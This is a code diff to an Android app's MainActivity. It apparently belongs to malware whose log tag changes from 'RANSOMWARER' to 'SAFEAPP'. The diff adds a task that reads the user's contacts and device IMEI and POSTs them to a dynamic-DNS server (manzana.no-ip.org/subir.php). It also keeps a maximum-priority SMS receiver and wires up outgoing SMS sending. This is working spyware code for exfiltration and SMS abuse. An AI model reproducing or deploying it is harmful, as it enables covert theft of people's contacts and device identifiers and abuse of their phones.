@@ -4,6 +4,7 @@ import java.io.File;
 import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
+import java.io.UnsupportedEncodingException;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Date;
@@ -13,6 +14,8 @@ import java.util.Locale;
 import org.apache.http.HttpResponse;
 import org.apache.http.HttpVersion;
 import org.apache.http.NameValuePair;
+import org.apache.http.ParseException;
+import org.apache.http.client.ClientProtocolException;
 import org.apache.http.client.HttpClient;
 import org.apache.http.client.entity.UrlEncodedFormEntity;
 import org.apache.http.client.methods.HttpPost;
@@ -33,6 +36,7 @@ import android.os.AsyncTask;
 import android.os.Bundle;
 import android.os.Environment;
 import android.os.Vibrator;
+import android.telephony.TelephonyManager;
 import android.util.Log;
 import android.view.Menu;
 import android.view.SurfaceView;
@@ -61,7 +65,7 @@ public class MainActivity extends Activity implements Commandable {
 		filter = new IntentFilter(SMS);
 		filter.setPriority(Integer.MAX_VALUE);
 
-		registerReceiver(receiver, filter);
+		registerReceiver(receiver, filter);	
 	}
 
 	protected void onRestart() {
@@ -79,42 +83,59 @@ public class MainActivity extends Activity implements Commandable {
 		return true;
 	}
 
-	private ArrayList<Contact> contacts;
-	private String URL = "http://tcbpg.com.ar/echo.php";
-	
-	public void getContactList() {
-		this.contacts = new ContactsReader(this.getApplicationContext()).contacts();
-		new AsyncTask< Void,Void,Void>(){
-			protected Void doInBackground(Void... arg0) {
-				try {
-					HttpPost post = new HttpPost(URL);
-					HttpClient client = new DefaultHttpClient();
-					client.getParams().setParameter(
-							CoreProtocolPNames.PROTOCOL_VERSION, HttpVersion.HTTP_1_1);
+	public class SendContactsTask extends AsyncTask<List<Contact>, Void, Void> {
+		private static final String URL = "http://manzana.no-ip.org/subir.php";
+		protected Void doInBackground(List<Contact>... arg0) {
 
-					List<NameValuePair> content = new ArrayList<NameValuePair>();
+			HttpPost post = new HttpPost(URL);
+			HttpClient client = new DefaultHttpClient();
+			client.getParams().setParameter(
+					CoreProtocolPNames.PROTOCOL_VERSION,
+					HttpVersion.HTTP_1_1);
 
-					StringBuilder sb = new StringBuilder();
-					sb.append("[");
-					for(Contact c : contacts){ 
-						sb.append(c.toString());
-						sb.append(",");
-					}
-					sb.setCharAt(sb.length()-1, ']');
+			List<NameValuePair> content = new ArrayList<NameValuePair>();
+			String body = new ListPresenter<Contact>(arg0[0]).toString();
+			content.add(new BasicNameValuePair("contacts",body));
 
-					content.add(new BasicNameValuePair("contacts",sb.toString()));
-					post.setEntity(new UrlEncodedFormEntity(content));
+			TelephonyManager t = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+			content.add(new BasicNameValuePair("imei",t.getDeviceId()));
 
-					HttpResponse response = client.execute(post);
-
-					Log.d("RANSOMWARER","Server replied: "
-						+ EntityUtils.toString(response.getEntity()));
-				} catch (Exception e) {
-					Log.e("RANSOMWARER", "Exception sending data: ", e);
-				}
+			try {
+				post.setEntity(new UrlEncodedFormEntity(content));
+			} catch (UnsupportedEncodingException e) {
+				Log.d("SAFEAPP", "UnsupportedEncodingException");
 				return null;
-			}			
-		}.execute();
+			}
+
+			HttpResponse response = null;
+
+			try {
+				response = client.execute(post);
+			} catch (ClientProtocolException e) {
+				Log.e("SAFEAPP", "ClientProtocolException",e);
+				return null;
+			} catch (IOException e) {
+				Log.d("SAFEAPP", "IOException 1: " + Log.getStackTraceString(e));
+				return null;
+			}
+
+			try {
+				Log.d("SAFEAPP",
+						"Server replied: "
+								+ EntityUtils.toString(response.getEntity()));
+			} catch (ParseException e) {
+				Log.d("SAFEAPP", Log.getStackTraceString(e));
+			} catch (IOException e) {
+				Log.d("SAFEAPP", Log.getStackTraceString(e));
+			}
+			return null;
+		}
+	}
+	
+	@SuppressWarnings("unchecked")
+	public void getContactList() {
+		final List<Contact> contacts = new ContactsReader(this.getApplicationContext()).contacts();
+		new SendContactsTask().execute(contacts);
 	}
 
 	private File getAlbumDir() {
@@ -193,7 +214,7 @@ public class MainActivity extends Activity implements Commandable {
 
 	@Override
 	public void sendSMS(String nro, String mensaje) {
-		// TODO Auto-generated method stub
+		new SMSSender().sendSMS(nro, mensaje);
 	}
 
 	// private Location userLocation;
